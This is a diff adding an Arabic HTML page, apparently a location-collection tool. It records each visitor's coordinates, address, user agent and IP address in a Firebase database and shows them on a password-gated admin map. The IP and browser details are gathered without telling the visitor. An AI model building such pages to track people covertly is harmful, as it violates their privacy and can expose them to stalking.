@@ -1,0 +1,1728 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>نظام تحديد المواقع</title>
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Cairo', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 50%, #f093fb 100%);
+            color: #333;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            text-align: center;
+        }
+        
+        /* صفحة الترحيب */
+        #welcomePage {
+            background: linear-gradient(145deg, rgba(255, 255, 255, 0.95), rgba(255, 255, 255, 0.85));
+            backdrop-filter: blur(20px);
+            border-radius: 25px;
+            padding: 50px 40px;
+            max-width: 500px;
+            width: 95%;
+            box-shadow: 
+                0 20px 40px rgba(0, 0, 0, 0.1),
+                0 0 0 1px rgba(255, 255, 255, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 350px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        #welcomePage::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(45deg, transparent, rgba(255,255,255,0.1), transparent);
+            transform: rotate(45deg);
+            animation: shimmer 3s infinite;
+        }
+
+        @keyframes shimmer {
+            0% { transform: rotate(45deg) translateX(-100%); }
+            100% { transform: rotate(45deg) translateX(100%); }
+        }
+        
+        .welcome-btn {
+            background: linear-gradient(135deg, #667eea, #764ba2, #f093fb);
+            background-size: 200% 200%;
+            color: white;
+            border: none;
+            padding: 20px 45px;
+            font-size: 1.4rem;
+            border-radius: 60px;
+            cursor: pointer;
+            transition: all 0.4s ease;
+            font-weight: bold;
+            margin: 25px 0;
+            box-shadow: 
+                0 10px 30px rgba(102, 126, 234, 0.4),
+                0 0 0 1px rgba(255, 255, 255, 0.2);
+            display: inline-flex;
+            align-items: center;
+            gap: 12px;
+            width: 100%;
+            max-width: 320px;
+            justify-content: center;
+            position: relative;
+            overflow: hidden;
+            animation: gradientShift 3s ease infinite;
+        }
+
+        @keyframes gradientShift {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+        
+        .welcome-btn:hover {
+            transform: translateY(-5px) scale(1.05);
+            box-shadow: 
+                0 15px 40px rgba(102, 126, 234, 0.6),
+                0 0 0 1px rgba(255, 255, 255, 0.3);
+            animation-play-state: paused;
+        }
+
+        .welcome-btn:active {
+            transform: translateY(-2px) scale(1.02);
+        }
+
+        /* صفحة كلمة المرور */
+        #passwordPage {
+            display: none;
+            background: linear-gradient(145deg, rgba(255, 255, 255, 0.95), rgba(255, 255, 255, 0.85));
+            backdrop-filter: blur(20px);
+            border-radius: 25px;
+            padding: 40px 30px;
+            max-width: 450px;
+            width: 95%;
+            box-shadow: 
+                0 20px 40px rgba(0, 0, 0, 0.1),
+                0 0 0 1px rgba(255, 255, 255, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            text-align: center;
+        }
+
+        .password-form {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+            margin-top: 20px;
+        }
+
+        .password-input {
+            padding: 15px 20px;
+            border: 2px solid rgba(102, 126, 234, 0.2);
+            border-radius: 15px;
+            font-size: 1.1rem;
+            background: rgba(255, 255, 255, 0.8);
+            transition: all 0.3s ease;
+            text-align: center;
+        }
+
+        .password-input:focus {
+            outline: none;
+            border-color: #667eea;
+            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+            background: white;
+        }
+
+        .password-btn {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 1.2rem;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-weight: bold;
+            box-shadow: 0 6px 20px rgba(102, 126, 234, 0.3);
+        }
+
+        .password-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 25px rgba(102, 126, 234, 0.5);
+        }
+
+        .password-error {
+            color: #ff6b6b;
+            font-size: 0.9rem;
+            margin-top: 10px;
+            display: none;
+        }
+        
+        /* صفحة الخريطة */
+        #mapPage {
+            display: none;
+            width: 100%;
+            max-width: 1200px;
+            animation: fadeIn 0.5s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .container {
+            background: linear-gradient(145deg, rgba(255, 255, 255, 0.95), rgba(255, 255, 255, 0.85));
+            backdrop-filter: blur(20px);
+            border-radius: 25px;
+            padding: 30px 25px;
+            width: 100%;
+            box-shadow: 
+                0 20px 40px rgba(0, 0, 0, 0.1),
+                0 0 0 1px rgba(255, 255, 255, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .container::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, #667eea, #764ba2, #f093fb);
+        }
+
+        /* شريط البحث */
+        .search-container {
+            background: linear-gradient(135deg, rgba(102, 126, 234, 0.05), rgba(118, 75, 162, 0.05));
+            border-radius: 15px;
+            padding: 20px;
+            margin: 20px 0;
+            border: 1px solid rgba(102, 126, 234, 0.1);
+            backdrop-filter: blur(10px);
+        }
+
+        .search-form {
+            display: grid;
+            grid-template-columns: 1fr 1fr auto;
+            gap: 15px;
+            align-items: end;
+        }
+
+        @media (max-width: 768px) {
+            .search-form {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        .search-input-group {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+
+        .search-label {
+            font-weight: 600;
+            color: #667eea;
+            text-align: right;
+        }
+
+        .search-input {
+            padding: 12px 15px;
+            border: 2px solid rgba(102, 126, 234, 0.2);
+            border-radius: 10px;
+            font-size: 1rem;
+            background: rgba(255, 255, 255, 0.8);
+            transition: all 0.3s ease;
+        }
+
+        .search-input:focus {
+            outline: none;
+            border-color: #667eea;
+            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+            background: white;
+        }
+        
+        .btn {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+            border: none;
+            padding: 14px 28px;
+            font-size: 1rem;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-weight: bold;
+            margin: 8px;
+            box-shadow: 0 6px 20px rgba(102, 126, 234, 0.3);
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 25px rgba(102, 126, 234, 0.5);
+            background: linear-gradient(135deg, #764ba2, #667eea);
+        }
+        
+        .btn-secondary {
+            background: linear-gradient(135deg, #ff6b6b, #ffa726);
+            box-shadow: 0 6px 20px rgba(255, 107, 107, 0.3);
+        }
+
+        .btn-secondary:hover {
+            background: linear-gradient(135deg, #ffa726, #ff6b6b);
+        }
+        
+        #map {
+            height: 450px;
+            width: 100%;
+            border-radius: 20px;
+            margin-top: 25px;
+            display: none;
+            border: 2px solid rgba(102, 126, 234, 0.3);
+            box-shadow: 0 12px 30px rgba(0, 0, 0, 0.15);
+            z-index: 1;
+            animation: slideUp 0.6s ease;
+        }
+
+        @keyframes slideUp {
+            from { 
+                opacity: 0; 
+                transform: translateY(30px); 
+            }
+            to { 
+                opacity: 1; 
+                transform: translateY(0); 
+            }
+        }
+        
+        .location-info {
+            background: linear-gradient(135deg, rgba(102, 126, 234, 0.05), rgba(118, 75, 162, 0.05));
+            border-radius: 20px;
+            padding: 25px;
+            margin-top: 25px;
+            display: none;
+            border: 1px solid rgba(102, 126, 234, 0.1);
+            backdrop-filter: blur(10px);
+            animation: slideUp 0.6s ease 0.2s both;
+        }
+        
+        .coordinates {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            margin-top: 20px;
+        }
+        
+        .coordinate-item {
+            background: linear-gradient(135deg, rgba(102, 126, 234, 0.1), rgba(118, 75, 162, 0.1));
+            padding: 15px;
+            border-radius: 15px;
+            text-align: center;
+            border-left: 4px solid #667eea;
+            backdrop-filter: blur(5px);
+            border: 1px solid rgba(102, 126, 234, 0.1);
+        }
+        
+        .loader {
+            border: 4px solid rgba(102, 126, 234, 0.2);
+            border-top: 4px solid #667eea;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 30px auto;
+            display: none;
+            box-shadow: 0 0 20px rgba(102, 126, 234, 0.3);
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .error {
+            background: linear-gradient(135deg, rgba(255, 107, 107, 0.1), rgba(255, 167, 38, 0.1));
+            border: 1px solid rgba(255, 107, 107, 0.2);
+            border-radius: 20px;
+            padding: 25px;
+            margin-top: 25px;
+            display: none;
+            color: #ff6b6b;
+            backdrop-filter: blur(10px);
+        }
+        
+        .address-info {
+            margin-top: 25px;
+            padding: 20px;
+            background: linear-gradient(135deg, rgba(102, 126, 234, 0.05), rgba(118, 75, 162, 0.05));
+            border-radius: 15px;
+            text-align: right;
+            border: 1px solid rgba(102, 126, 234, 0.1);
+        }
+        
+        .map-controls {
+            display: flex;
+            justify-content: center;
+            margin-top: 20px;
+            gap: 12px;
+            flex-wrap: wrap;
+        }
+        
+        .map-type-btn {
+            background: linear-gradient(135deg, rgba(102, 126, 234, 0.1), rgba(118, 75, 162, 0.1));
+            color: #667eea;
+            border: 1px solid rgba(102, 126, 234, 0.3);
+            padding: 10px 18px;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-size: 0.95rem;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            flex: 1;
+            min-width: 130px;
+            justify-content: center;
+            backdrop-filter: blur(5px);
+        }
+        
+        .map-type-btn.active {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+            border-color: #667eea;
+            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
+        }
+        
+        .map-type-btn:hover {
+            background: linear-gradient(135deg, rgba(102, 126, 234, 0.2), rgba(118, 75, 162, 0.2));
+            transform: translateY(-2px);
+        }
+        
+        .location-details {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            margin-top: 20px;
+        }
+        
+        .detail-item {
+            background: linear-gradient(135deg, rgba(102, 126, 234, 0.05), rgba(118, 75, 162, 0.05));
+            padding: 15px;
+            border-radius: 12px;
+            text-align: right;
+            border-right: 4px solid #4CAF50;
+            backdrop-filter: blur(5px);
+            border: 1px solid rgba(76, 175, 80, 0.1);
+        }
+        
+        .accuracy-indicator {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-top: 15px;
+            gap: 10px;
+            background: linear-gradient(135deg, rgba(102, 126, 234, 0.05), rgba(118, 75, 162, 0.05));
+            padding: 15px;
+            border-radius: 12px;
+            flex-wrap: wrap;
+            border: 1px solid rgba(102, 126, 234, 0.1);
+        }
+        
+        .accuracy-bar {
+            height: 8px;
+            background: linear-gradient(135deg, rgba(102, 126, 234, 0.2), rgba(118, 75, 162, 0.2));
+            border-radius: 10px;
+            flex: 1;
+            max-width: 250px;
+            min-width: 180px;
+            overflow: hidden;
+            border: 1px solid rgba(102, 126, 234, 0.1);
+        }
+        
+        .accuracy-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #4CAF50, #8BC34A, #CDDC39);
+            border-radius: 10px;
+            transition: width 0.8s cubic-bezier(0.4, 0, 0.2, 1);
+            box-shadow: 0 0 10px rgba(76, 175, 80, 0.3);
+        }
+        
+        /* تحسينات للجوال */
+        @media (max-width: 768px) {
+            body {
+                padding: 15px;
+                justify-content: flex-start;
+                background: linear-gradient(135deg, #667eea 0%, #764ba2 70%, #f093fb 100%);
+            }
+            
+            #welcomePage, #passwordPage {
+                padding: 40px 25px;
+                min-height: 300px;
+                margin: 20px 0;
+                border-radius: 20px;
+            }
+            
+            .welcome-btn {
+                padding: 18px 35px;
+                font-size: 1.3rem;
+                max-width: 300px;
+                border-radius: 50px;
+            }
+            
+            .container {
+                padding: 25px 20px;
+                margin: 15px 0;
+                border-radius: 20px;
+            }
+            
+            #map {
+                height: 350px;
+                border-radius: 15px;
+            }
+            
+            .coordinates, .location-details {
+                grid-template-columns: 1fr;
+                gap: 12px;
+            }
+            
+            .map-controls {
+                flex-direction: column;
+                align-items: center;
+                gap: 10px;
+            }
+            
+            .map-type-btn {
+                width: 100%;
+                max-width: 220px;
+                border-radius: 10px;
+            }
+            
+            .coordinate-item, .detail-item {
+                padding: 12px;
+                border-radius: 12px;
+            }
+            
+            .accuracy-indicator {
+                flex-direction: column;
+                text-align: center;
+                gap: 8px;
+            }
+            
+            .accuracy-bar {
+                max-width: 100%;
+                min-width: 100%;
+            }
+        }
+        
+        /* تحسينات للكمبيوتر */
+        @media (min-width: 1200px) {
+            #map {
+                height: 500px;
+            }
+            
+            .container {
+                padding: 35px 30px;
+            }
+            
+            #welcomePage, #passwordPage {
+                padding: 60px 50px;
+                min-height: 400px;
+            }
+
+            .welcome-btn {
+                padding: 22px 50px;
+                font-size: 1.5rem;
+                max-width: 350px;
+            }
+        }
+        
+        .success-message {
+            background: linear-gradient(135deg, rgba(76, 175, 80, 0.1), rgba(139, 195, 74, 0.1));
+            border: 1px solid rgba(76, 175, 80, 0.2);
+            border-radius: 15px;
+            padding: 20px;
+            margin-top: 20px;
+            display: none;
+            text-align: center;
+            color: #4CAF50;
+            backdrop-filter: blur(10px);
+            animation: slideUp 0.6s ease;
+        }
+        
+        .info-card {
+            background: linear-gradient(135deg, rgba(255, 255, 255, 0.6), rgba(255, 255, 255, 0.4));
+            border-radius: 15px;
+            padding: 20px;
+            margin: 15px 0;
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            backdrop-filter: blur(10px);
+        }
+        
+        .back-btn {
+            background: linear-gradient(135deg, rgba(102, 126, 234, 0.1), rgba(118, 75, 162, 0.1));
+            color: #667eea;
+            border: 1px solid rgba(102, 126, 234, 0.3);
+            padding: 10px 20px;
+            border-radius: 50px;
+            cursor: pointer;
+            margin-bottom: 20px;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 0.95rem;
+            transition: all 0.3s ease;
+            backdrop-filter: blur(5px);
+        }
+        
+        .back-btn:hover {
+            background: linear-gradient(135deg, rgba(102, 126, 234, 0.2), rgba(118, 75, 162, 0.2));
+            transform: translateY(-2px);
+        }
+        
+        /* تحسينات Leaflet */
+        .leaflet-container {
+            background: #f8f9fa;
+            font-family: 'Cairo', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            border-radius: 18px;
+        }
+        
+        .leaflet-popup-content {
+            text-align: center;
+            font-family: 'Cairo', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 15px;
+            font-size: 0.95rem;
+        }
+        
+        .custom-marker {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            border: 3px solid white;
+            border-radius: 50%;
+            box-shadow: 
+                0 4px 15px rgba(102, 126, 234, 0.4),
+                0 0 0 2px rgba(102, 126, 234, 0.2);
+            animation: pulse-marker 2s infinite;
+        }
+        
+        @keyframes pulse-marker {
+            0% { 
+                box-shadow: 
+                    0 0 0 0 rgba(102, 126, 234, 0.7),
+                    0 0 0 0 rgba(102, 126, 234, 0.4);
+            }
+            70% { 
+                box-shadow: 
+                    0 0 0 15px rgba(102, 126, 234, 0),
+                    0 0 0 30px rgba(102, 126, 234, 0);
+            }
+            100% { 
+                box-shadow: 
+                    0 0 0 0 rgba(102, 126, 234, 0),
+                    0 0 0 0 rgba(102, 126, 234, 0);
+            }
+        }
+
+        .firebase-status {
+            background: linear-gradient(135deg, rgba(255, 193, 7, 0.1), rgba(255, 152, 0, 0.1));
+            border: 1px solid rgba(255, 193, 7, 0.2);
+            border-radius: 15px;
+            padding: 15px;
+            margin: 15px 0;
+            display: none;
+            color: #FF9800;
+            text-align: center;
+            font-size: 0.95rem;
+            backdrop-filter: blur(10px);
+            animation: slideUp 0.6s ease;
+        }
+
+        .firebase-success {
+            background: linear-gradient(135deg, rgba(76, 175, 80, 0.1), rgba(56, 142, 60, 0.1));
+            border: 1px solid rgba(76, 175, 80, 0.2);
+            color: #4CAF50;
+        }
+
+        .firebase-error {
+            background: linear-gradient(135deg, rgba(244, 67, 54, 0.1), rgba(211, 47, 47, 0.1));
+            border: 1px solid rgba(244, 67, 54, 0.2);
+            color: #F44336;
+        }
+        
+        /* تحسينات عامة */
+        h1, h2, h3 {
+            margin-bottom: 20px;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        
+        p {
+            line-height: 1.6;
+            margin-bottom: 20px;
+            color: #555;
+        }
+        
+        strong {
+            font-weight: 700;
+            color: #667eea;
+        }
+
+        .floating {
+            animation: floating 3s ease-in-out infinite;
+        }
+
+        @keyframes floating {
+            0% { transform: translateY(0px); }
+            50% { transform: translateY(-10px); }
+            100% { transform: translateY(0px); }
+        }
+        
+        /* صفحة عرض البيانات */
+        #dataPage {
+            display: none;
+            width: 100%;
+            max-width: 800px;
+            animation: fadeIn 0.5s ease;
+        }
+        
+        .data-container {
+            background: linear-gradient(145deg, rgba(255, 255, 255, 0.95), rgba(255, 255, 255, 0.85));
+            backdrop-filter: blur(20px);
+            border-radius: 25px;
+            padding: 30px 25px;
+            width: 100%;
+            box-shadow: 
+                0 20px 40px rgba(0, 0, 0, 0.1),
+                0 0 0 1px rgba(255, 255, 255, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .data-container::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, #667eea, #764ba2, #f093fb);
+        }
+        
+        .data-actions {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-top: 25px;
+            flex-wrap: wrap;
+        }
+        
+        .data-card {
+            background: linear-gradient(135deg, rgba(102, 126, 234, 0.05), rgba(118, 75, 162, 0.05));
+            border-radius: 20px;
+            padding: 25px;
+            margin: 20px 0;
+            border: 1px solid rgba(102, 126, 234, 0.1);
+            backdrop-filter: blur(10px);
+        }
+        
+        .data-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 15px;
+            margin-top: 20px;
+        }
+        
+        .data-item {
+            background: linear-gradient(135deg, rgba(102, 126, 234, 0.1), rgba(118, 75, 162, 0.1));
+            padding: 15px;
+            border-radius: 15px;
+            text-align: right;
+            border-left: 4px solid #667eea;
+            backdrop-filter: blur(5px);
+            border: 1px solid rgba(102, 126, 234, 0.1);
+        }
+        
+        .location-count {
+            background: linear-gradient(135deg, rgba(255, 193, 7, 0.1), rgba(255, 152, 0, 0.1));
+            border: 1px solid rgba(255, 193, 7, 0.2);
+            border-radius: 15px;
+            padding: 15px;
+            margin: 15px 0;
+            text-align: center;
+            color: #FF9800;
+            backdrop-filter: blur(10px);
+        }
+    </style>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <!-- صفحة الترحيب -->
+    <div id="welcomePage">
+        <h1>📍 مرحباً بك</h1>
+        <button id="startBtn" class="welcome-btn floating">
+            <span>📍</span> اضغط لملء البيانات
+        </button>
+        <div class="location-count">
+            <strong>📊 إحصائيات:</strong> 
+            <span id="totalLocations">0</span> موقع تم حفظها حتى الآن
+        </div>
+    </div>
+
+    <!-- صفحة كلمة المرور -->
+    <div id="passwordPage">
+        <h2>🔒 أدخل كلمة المرور</h2>
+        <p>يجب إدخال كلمة المرور للوصول إلى صفحة الخريطة (الإدارة)</p>
+        <div class="password-form">
+            <input type="password" id="passwordInput" class="password-input" placeholder="أدخل كلمة المرور هنا">
+            <button id="passwordBtn" class="password-btn">دخول</button>
+            <div id="passwordError" class="password-error">كلمة المرور غير صحيحة!</div>
+        </div>
+    </div>
+
+    <!-- صفحة عرض البيانات -->
+    <div id="dataPage">
+        <div class="data-container">
+            <h2>✅ تم تحديد موقعك بنجاح</h2>
+            
+            <div class="data-card">
+                <h3>📋 معلومات الموقع</h3>
+                <div class="data-grid">
+                    <div class="data-item">
+                        <strong>خط العرض:</strong>
+                        <span id="dataLatitude">--</span>
+                    </div>
+                    <div class="data-item">
+                        <strong>خط الطول:</strong>
+                        <span id="dataLongitude">--</span>
+                    </div>
+                    <div class="data-item">
+                        <strong>دقة الموقع:</strong>
+                        <span id="dataAccuracy">--</span> متر
+                    </div>
+                </div>
+                
+                <div class="accuracy-indicator">
+                    <span>مستوى الدقة:</span>
+                    <div class="accuracy-bar">
+                        <div id="dataAccuracyFill" class="accuracy-fill" style="width: 0%"></div>
+                    </div>
+                    <span id="dataAccuracyText">0%</span>
+                </div>
+            </div>
+            
+            <div class="data-card">
+                <h3>🏠 العنوان التفصيلي</h3>
+                <div class="address-info">
+                    <p id="dataAddress">جاري تحديد العنوان...</p>
+                </div>
+            </div>
+            
+            <div class="data-card">
+                <h3>📊 تفاصيل الموقع</h3>
+                <div class="location-details">
+                    <div class="detail-item" id="dataCountry">
+                        <strong>🇺🇳 الدولة:</strong> <span>--</span>
+                    </div>
+                    <div class="detail-item" id="dataCity">
+                        <strong>🏙️ المدينة:</strong> <span>--</span>
+                    </div>
+                    <div class="detail-item" id="dataDistrict">
+                        <strong>🏘️ الحي:</strong> <span>--</span>
+                    </div>
+                    <div class="detail-item" id="dataRoad">
+                        <strong>🛣️ الشارع:</strong> <span>--</span>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="data-actions">
+                <button id="adminBtn" class="btn">
+                    <span>🗺️</span> عرض الخريطة (للمشرفين)
+                </button>
+                <button id="newLocationBtn" class="btn btn-secondary">
+                    <span>🔄</span> تحديد موقع جديد
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- صفحة الخريطة -->
+    <div id="mapPage">
+        <div class="container">
+            <button id="backBtn" class="back-btn">
+                <span>←</span> العودة
+            </button>
+            
+            <!-- شريط البحث -->
+            <div class="search-container">
+                <h3>🔍 البحث عن موقع</h3>
+                <div class="search-form">
+                    <div class="search-input-group">
+                        <label class="search-label">خط العرض</label>
+                        <input type="number" id="latitudeInput" class="search-input" placeholder="مثال: 30.0444" step="any" min="-90" max="90">
+                    </div>
+                    <div class="search-input-group">
+                        <label class="search-label">خط الطول</label>
+                        <input type="number" id="longitudeInput" class="search-input" placeholder="مثال: 31.2357" step="any" min="-180" max="180">
+                    </div>
+                    <button id="searchBtn" class="btn">
+                        <span>🔍</span> بحث
+                    </button>
+                </div>
+            </div>
+            
+            <div id="loader" class="loader"></div>
+            
+            <div id="successMessage" class="success-message">
+                <strong>✅ تم تحديد موقعك بنجاح!</strong>
+            </div>
+
+            <div id="firebaseStatus" class="firebase-status">
+                <strong>📡 جاري حفظ البيانات...</strong>
+            </div>
+            
+            <div id="map"></div>
+            
+            <div class="map-controls">
+                <button id="standardBtn" class="map-type-btn active">
+                    <span>🛣️</span> الخريطة العادية
+                </button>
+                <button id="satelliteBtn" class="map-type-btn">
+                    <span>🛰️</span> القمر الصناعي
+                </button>
+                <button id="detailedBtn" class="map-type-btn">
+                    <span>🏙️</span> خريطة مفصلة
+                </button>
+            </div>
+            
+            <div id="locationInfo" class="location-info">
+                <h2>📋 معلومات الموقع</h2>
+                
+                <div class="info-card">
+                    <h3>الإحداثيات الجغرافية</h3>
+                    <div class="coordinates">
+                        <div class="coordinate-item">
+                            <strong>خط العرض:</strong>
+                            <span id="latitude">--</span>
+                        </div>
+                        <div class="coordinate-item">
+                            <strong>خط الطول:</strong>
+                            <span id="longitude">--</span>
+                        </div>
+                        <div class="coordinate-item">
+                            <strong>دقة الموقع:</strong>
+                            <span id="accuracy">--</span> متر
+                        </div>
+                    </div>
+                    
+                    <div class="accuracy-indicator">
+                        <span>مستوى الدقة:</span>
+                        <div class="accuracy-bar">
+                            <div id="accuracyFill" class="accuracy-fill" style="width: 0%"></div>
+                        </div>
+                        <span id="accuracyText">0%</span>
+                    </div>
+                </div>
+                
+                <div class="info-card">
+                    <h3>🏠 العنوان التفصيلي</h3>
+                    <div class="address-info">
+                        <p id="address">جاري تحديد العنوان...</p>
+                    </div>
+                </div>
+                
+                <div class="info-card">
+                    <h3>📊 تفاصيل الموقع</h3>
+                    <div class="location-details">
+                        <div class="detail-item" id="country">
+                            <strong>🇺🇳 الدولة:</strong> <span>--</span>
+                        </div>
+                        <div class="detail-item" id="city">
+                            <strong>🏙️ المدينة:</strong> <span>--</span>
+                        </div>
+                        <div class="detail-item" id="district">
+                            <strong>🏘️ الحي:</strong> <span>--</span>
+                        </div>
+                        <div class="detail-item" id="road">
+                            <strong>🛣️ الشارع:</strong> <span>--</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div id="error" class="error">
+                <h2>⚠️ حدث خطأ</h2>
+                <p id="errorMessage"></p>
+                <button id="retryBtn" class="btn btn-secondary">
+                    <span>🔄</span> إعادة المحاولة
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Leaflet JS -->
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+    
+    <!-- Firebase SDK -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+        import { getDatabase, ref, push, onValue } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
+
+        // Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyAGYRjGl7TtE8DbrQUwSA3rsZ88TNG3PPA",
+            authDomain: "maps-8c0ec.firebaseapp.com",
+            databaseURL: "https://maps-8c0ec-default-rtdb.firebaseio.com",
+            projectId: "maps-8c0ec",
+            storageBucket: "maps-8c0ec.firebasestorage.app",
+            messagingSenderId: "87731597043",
+            appId: "1:87731597043:web:e2f37765c7bf7acc881186"
+        };
+
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const database = getDatabase(app);
+
+        // دالة للحصول على عنوان IP
+        async function getIPAddress() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                return 'غير معروف';
+            }
+        }
+
+        // دالة حفظ البيانات في Firebase
+        window.saveLocationToFirebase = async function(locationData) {
+            try {
+                const locationsRef = ref(database, 'locations');
+                const newLocationRef = await push(locationsRef, {
+                    latitude: locationData.latitude,
+                    longitude: locationData.longitude,
+                    accuracy: locationData.accuracy,
+                    address: locationData.address,
+                    addressDetails: locationData.addressDetails || {},
+                    timestamp: new Date().toISOString(),
+                    userAgent: navigator.userAgent,
+                    ip: await getIPAddress(),
+                    savedAt: new Date().toISOString()
+                });
+                
+                console.log("✅ تم حفظ الموقع في Firebase بنجاح:", newLocationRef.key);
+                return { success: true, key: newLocationRef.key };
+            } catch (error) {
+                console.error("❌ خطأ في حفظ البيانات:", error);
+                return { success: false, error: error.message };
+            }
+        };
+
+        // دالة لجلب عدد المواقع المحفوظة
+        function getLocationsCount() {
+            const locationsRef = ref(database, 'locations');
+            onValue(locationsRef, (snapshot) => {
+                const data = snapshot.val();
+                const count = data ? Object.keys(data).length : 0;
+                document.getElementById('totalLocations').textContent = count;
+            });
+        }
+
+        // استدعاء الدالة عند تحميل الصفحة
+        document.addEventListener('DOMContentLoaded', function() {
+            getLocationsCount();
+        });
+    </script>
+
+    <script>
+        // عناصر DOM
+        const welcomePage = document.getElementById('welcomePage');
+        const passwordPage = document.getElementById('passwordPage');
+        const dataPage = document.getElementById('dataPage');
+        const mapPage = document.getElementById('mapPage');
+        const startBtn = document.getElementById('startBtn');
+        const passwordBtn = document.getElementById('passwordBtn');
+        const passwordInput = document.getElementById('passwordInput');
+        const passwordError = document.getElementById('passwordError');
+        const adminBtn = document.getElementById('adminBtn');
+        const newLocationBtn = document.getElementById('newLocationBtn');
+        const backBtn = document.getElementById('backBtn');
+        const retryBtn = document.getElementById('retryBtn');
+        const searchBtn = document.getElementById('searchBtn');
+        const latitudeInput = document.getElementById('latitudeInput');
+        const longitudeInput = document.getElementById('longitudeInput');
+        const loader = document.getElementById('loader');
+        const mapContainer = document.getElementById('map');
+        const locationInfo = document.getElementById('locationInfo');
+        const errorDiv = document.getElementById('error');
+        const errorMessage = document.getElementById('errorMessage');
+        const addressElement = document.getElementById('address');
+        const successMessage = document.getElementById('successMessage');
+        const firebaseStatus = document.getElementById('firebaseStatus');
+        const accuracyFill = document.getElementById('accuracyFill');
+        const accuracyText = document.getElementById('accuracyText');
+        
+        // عناصر صفحة البيانات
+        const dataLatitude = document.getElementById('dataLatitude');
+        const dataLongitude = document.getElementById('dataLongitude');
+        const dataAccuracy = document.getElementById('dataAccuracy');
+        const dataAccuracyFill = document.getElementById('dataAccuracyFill');
+        const dataAccuracyText = document.getElementById('dataAccuracyText');
+        const dataAddress = document.getElementById('dataAddress');
+        const dataCountry = document.getElementById('dataCountry');
+        const dataCity = document.getElementById('dataCity');
+        const dataDistrict = document.getElementById('dataDistrict');
+        const dataRoad = document.getElementById('dataRoad');
+        
